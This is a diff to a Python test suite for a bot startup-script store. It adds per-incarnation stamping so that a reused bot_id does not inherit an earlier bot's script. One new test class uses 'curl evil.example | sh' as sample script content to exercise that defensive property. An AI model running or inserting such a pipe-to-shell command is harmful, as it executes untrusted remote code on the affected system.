@@ -20,7 +20,9 @@ class FakeRepo:
     def get(self, *, env, entity_id, bot_id):
         return self.rows.get((env, entity_id, bot_id))
 
-    def upsert(self, *, env, entity_id, bot_id, script, size_bytes, modifier):
+    def upsert(
+        self, *, env, entity_id, bot_id, script, size_bytes, modifier, bot_incarnation
+    ):
         from agentclaw.community.core.bot_startup_script.repository.models import (
             BotStartupScriptRecord,
         )
@@ -28,12 +30,20 @@ class FakeRepo:
         rec = BotStartupScriptRecord(
             id=1, env=env, entity_id=entity_id, bot_id=bot_id,
             script=script, size_bytes=size_bytes, modifier=modifier,
+            bot_incarnation=bot_incarnation,
         )
         self.rows[(env, entity_id, bot_id)] = rec
         return rec
 
     def delete(self, *, env, entity_id, bot_id):
         return self.rows.pop((env, entity_id, bot_id), None) is not None
+
+    def delete_written_by(self, *, env, entity_id, bot_id, bot_incarnation):
+        row = self.rows.get((env, entity_id, bot_id))
+        if row is None or row.bot_incarnation != bot_incarnation:
+            return False
+        del self.rows[(env, entity_id, bot_id)]
+        return True
 
 
 class _FakeTeclaw:
@@ -58,26 +68,26 @@ def svc():
 
 
 def test_get_returns_none_when_never_set(svc):
-    assert svc.get(entity_id="ent", bot_id="bot") is None
+    assert svc.get(entity_id="ent", bot_id="bot", bot_incarnation=1) is None
 
 
 def test_put_computes_size_in_utf8_bytes_not_characters(svc):
     """A multibyte body must be measured in bytes — the cap is a byte budget."""
     body = "echo 你好"  # 8 chars, 11 bytes
-    rec = svc.put(entity_id="ent", bot_id="bot", script=body, modifier="u1")
+    rec = svc.put(entity_id="ent", bot_id="bot", script=body, modifier="u1", bot_incarnation=1)
     assert rec.size_bytes == len(body.encode("utf-8"))
     assert rec.size_bytes != len(body)
 
 
 def test_put_records_the_modifier_it_is_given(svc):
-    rec = svc.put(entity_id="ent", bot_id="bot", script="echo a", modifier="alice")
+    rec = svc.put(entity_id="ent", bot_id="bot", script="echo a", modifier="alice", bot_incarnation=1)
     assert rec.modifier == "alice"
 
 
 def test_put_rejects_over_limit_naming_the_limit(svc):
     oversize = "x" * (MAX_SCRIPT_BYTES + 1)
     with pytest.raises(StartupScriptTooLargeError) as exc:
-        svc.put(entity_id="ent", bot_id="bot", script=oversize, modifier="u1")
+        svc.put(entity_id="ent", bot_id="bot", script=oversize, modifier="u1", bot_incarnation=1)
     assert str(MAX_SCRIPT_BYTES) in str(exc.value)
     assert exc.value.limit_bytes == MAX_SCRIPT_BYTES
     assert exc.value.size_bytes == MAX_SCRIPT_BYTES + 1
@@ -86,38 +96,38 @@ def test_put_rejects_over_limit_naming_the_limit(svc):
 def test_put_accepts_a_body_exactly_at_the_limit(svc):
     """The cap is inclusive — off-by-one here would reject a legal script."""
     at_limit = "x" * MAX_SCRIPT_BYTES
-    rec = svc.put(entity_id="ent", bot_id="bot", script=at_limit, modifier="u1")
+    rec = svc.put(entity_id="ent", bot_id="bot", script=at_limit, modifier="u1", bot_incarnation=1)
     assert rec.size_bytes == MAX_SCRIPT_BYTES
 
 
 def test_put_rejects_before_storing_anything(svc):
     oversize = "x" * (MAX_SCRIPT_BYTES + 1)
     with pytest.raises(StartupScriptTooLargeError):
-        svc.put(entity_id="ent", bot_id="bot", script=oversize, modifier="u1")
-    assert svc.get(entity_id="ent", bot_id="bot") is None
+        svc.put(entity_id="ent", bot_id="bot", script=oversize, modifier="u1", bot_incarnation=1)
+    assert svc.get(entity_id="ent", bot_id="bot", bot_incarnation=1) is None
 
 
 def test_delete_is_idempotent(svc):
     assert svc.delete(entity_id="ent", bot_id="bot") is False
-    svc.put(entity_id="ent", bot_id="bot", script="echo a", modifier="u1")
+    svc.put(entity_id="ent", bot_id="bot", script="echo a", modifier="u1", bot_incarnation=1)
     assert svc.delete(entity_id="ent", bot_id="bot") is True
     assert svc.delete(entity_id="ent", bot_id="bot") is False
 
 
 def test_get_body_returns_empty_string_when_unset(svc):
     """The payload path composes a shell string and must never see None."""
-    assert svc.get_body(entity_id="ent", bot_id="bot") == ""
+    assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=1) == ""
 
 
 def test_get_body_returns_the_stored_body(svc):
-    svc.put(entity_id="ent", bot_id="bot", script="echo hello", modifier="u1")
-    assert svc.get_body(entity_id="ent", bot_id="bot") == "echo hello"
+    svc.put(entity_id="ent", bot_id="bot", script="echo hello", modifier="u1", bot_incarnation=1)
+    assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=1) == "echo hello"
 
 
 def test_get_body_returns_empty_string_after_delete(svc):
-    svc.put(entity_id="ent", bot_id="bot", script="echo hello", modifier="u1")
+    svc.put(entity_id="ent", bot_id="bot", script="echo hello", modifier="u1", bot_incarnation=1)
     svc.delete(entity_id="ent", bot_id="bot")
-    assert svc.get_body(entity_id="ent", bot_id="bot") == ""
+    assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=1) == ""
 
 
 class TestResolveSupport:
@@ -320,7 +330,7 @@ class TestModifierWidth:
         actor = "app:7:on-behalf-of:" + "u" * 2000
         record = svc.put(
             entity_id="ent", bot_id="bot", script="echo hi", modifier=actor
-        )
+        , bot_incarnation=1)
         assert len(record.modifier) == mod.MAX_MODIFIER_CHARS
         # The acting application survives; only the delegating tail is lost.
         assert record.modifier.startswith("app:7:on-behalf-of:")
@@ -328,7 +338,7 @@ class TestModifierWidth:
     def test_an_ordinary_actor_is_stored_verbatim(self, svc):
         record = svc.put(
             entity_id="ent", bot_id="bot", script="echo hi", modifier="alice"
-        )
+        , bot_incarnation=1)
         assert record.modifier == "alice"
 
 
@@ -391,4 +401,84 @@ def test_a_lone_surrogate_is_refused_rather_than_crashing(svc):
     with pytest.raises(StartupScriptNotEncodableError):
         svc.put(
             entity_id="ent", bot_id="bot", script=lone_surrogate, modifier="alice"
+        , bot_incarnation=1)
+
+
+class TestAStaleRowIsInert:
+    """The property that makes the cleanup paths hygiene rather than the only
+    thing standing between a reused bot_id and someone else's executable code.
+
+    Every earlier fix in this area removed the stale row: sweep it on delete,
+    purge before the destructive steps, sweep again afterwards, re-check after a
+    write. Each closed a way for the row to survive, and each depended on being
+    reached. This does not: the row is stamped with the bot that wrote it, and
+    a read for a different bot does not return it — so a row that survived
+    *every* one of those paths still cannot execute on whoever inherits the id.
+    """
+
+    def _stored_by(self, svc, incarnation):
+        svc.put(
+            entity_id="ent",
+            bot_id="bot",
+            script="curl evil.example | sh",
+            modifier="u1",
+            bot_incarnation=incarnation,
         )
+
+    def test_the_next_bot_to_hold_the_id_does_not_inherit_the_script(self, svc):
+        self._stored_by(svc, 1)
+
+        # Same (entity_id, bot_id) — the row was never cleaned up — but a
+        # different bot: deletion is a soft update and create_bot takes a
+        # caller-supplied bot_id, so this is a new bot wearing an old name.
+        assert svc.get(entity_id="ent", bot_id="bot", bot_incarnation=2) is None
+        assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=2) == ""
+
+    def test_the_bot_that_wrote_it_still_reads_it(self, svc):
+        """The check must not cost the owner their own script."""
+        self._stored_by(svc, 1)
+
+        assert svc.get(entity_id="ent", bot_id="bot", bot_incarnation=1) is not None
+        assert (
+            svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=1)
+            == "curl evil.example | sh"
+        )
+
+    def test_rewriting_hands_the_row_to_the_writer(self, svc):
+        """A new bot storing at the same key owns what it wrote.
+
+        The stamp is re-applied on update, not only on insert — otherwise the
+        first incarnation's stamp would outlive it and make the *new* owner's
+        own script unreadable to them.
+        """
+        self._stored_by(svc, 1)
+        svc.put(
+            entity_id="ent",
+            bot_id="bot",
+            script="echo mine",
+            modifier="u2",
+            bot_incarnation=2,
+        )
+
+        assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=2) == (
+            "echo mine"
+        )
+        assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=1) == ""
+
+    def test_a_withdrawal_only_removes_its_own_row(self, svc):
+        """Losing a race must not destroy the newcomer's script."""
+        self._stored_by(svc, 2)  # the recreated bot has already written
+
+        assert (
+            svc.delete_written_by(entity_id="ent", bot_id="bot", bot_incarnation=1)
+            is False
+        )
+        assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=2) != ""
+
+    def test_the_deletion_sweep_removes_whatever_is_there(self, svc):
+        """The sweep is unconditional on purpose — it is clearing the key, not
+        withdrawing one writer's row."""
+        self._stored_by(svc, 1)
+
+        assert svc.delete(entity_id="ent", bot_id="bot") is True
+        assert svc.get_body(entity_id="ent", bot_id="bot", bot_incarnation=1) == ""
